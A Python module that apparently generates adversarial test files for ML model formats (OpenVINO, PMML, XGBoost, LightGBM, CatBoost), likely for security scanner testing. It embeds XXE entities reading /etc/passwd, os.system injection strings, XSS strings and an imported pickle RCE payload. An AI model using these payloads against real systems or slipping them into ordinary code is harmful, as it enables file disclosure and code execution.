"""Inference engine format generators: OpenVINO, PMML, XGBoost, LightGBM, CatBoost."""

from __future__ import annotations

import random
import struct

from .base import pickle_rce_payload


def gen_openvino_xml(rng: random.Random) -> bytes:
    """Generate adversarial OpenVINO IR XML."""
    layer_type = rng.choice(["Custom", "PythonOp", "ExternalCall"])
    xml = f"""<?xml version="1.0"?>
<!DOCTYPE net [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<net name="model" version="11">
  <layers>
    <layer id="0" name="entry" type="{layer_type}">
      <data command="__import__('os').system('id')" path="&xxe;" />
    </layer>
  </layers>
</net>
"""
    return xml.encode("utf-8")


def gen_pmml_xml(rng: random.Random) -> bytes:
    """Generate adversarial PMML XML."""
    ext_name = rng.choice(["script", "python", "system"])
    xml = f"""<?xml version="1.0"?>
<!DOCTYPE PMML [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<PMML version="4.4">
  <Header>
    <Extension name="{ext_name}" value="exec(__import__('os').system('id'))" />
  </Header>
  <TreeModel>
    <Node>
      <SimplePredicate
        field="x"
        operator="equal"
        value="eval('__import__(\\'os\\').system(\\'id\\')')"
      />
    </Node>
  </TreeModel>
</PMML>
"""
    return xml.encode("utf-8")


def gen_xgboost_binary(rng: random.Random) -> bytes:
    """Generate XGBoost native-binary-like bytes."""
    return (
        b"binf"
        + struct.pack("<Q", rng.choice([0, 1, 0xFFFFFFFFFFFFFFFF]))
        + b"feature=__import__('os').system('id')\x00"
        + pickle_rce_payload()
        + b"\x7fELF"
    )


def gen_lightgbm_text(rng: random.Random) -> bytes:
    """Generate LightGBM text model content."""
    feature = rng.choice([
        "<script>alert(1)</script>",
        "__import__('os').system('id')",
        "javascript:alert(1)",
    ])
    text = f"""tree
version=v4
num_class=100001
num_tree_per_iteration=1000001
feature_names=normal {feature}
objective=eval_system
Tree=0
"""
    return text.encode("utf-8") + pickle_rce_payload()


def gen_catboost_binary(rng: random.Random) -> bytes:
    """Generate CatBoost .cbm-like binary bytes."""
    return (
        b"\xa0\xb1\xc2\xd3"
        + struct.pack("<Q", rng.choice([0, 1, 0xFFFFFFFFFFFFFFFF]))
        + b"feature=__import__('os').system('id')\x00"
        + pickle_rce_payload()
        + b"MZ"
    )
